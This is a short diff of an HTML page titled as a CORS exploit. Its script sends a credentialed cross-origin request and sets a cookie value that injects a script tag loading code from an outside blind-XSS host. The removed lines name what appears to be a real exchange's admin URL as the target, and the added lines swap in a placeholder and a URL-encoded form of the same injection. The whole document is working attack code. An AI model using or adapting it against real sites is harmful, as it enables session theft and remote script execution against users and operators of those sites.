@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS44 Exploit with Cookie</title>
+    <title>CORS555 Exploit with Cookie</title>
 </head>
 <body>
     <h1>CORS Exploit with Custom Cookie</h1>
@@ -19,12 +19,11 @@
                 }
             };
             
-            var url = 'https://csboss.okex.org/newboss/home';
+            var url = 'https://vulnerable-website.com/sensitive-victim-data';
             xhr.open('GET', url, true);
             xhr.withCredentials = true;
             
-            // Escape characters in the cookie value
-            var cookieValue = 'turbo-cdn="><scr"+"ipt src="//naysser.bxss.in"></scr"+"ipt>"';
+            var cookieValue = 'turbo-cdn=ff%22%3c%3cscript%20src%3d//naysser.bxss.in%3e';
             xhr.setRequestHeader('Cookie', cookieValue);
             
             xhr.send();
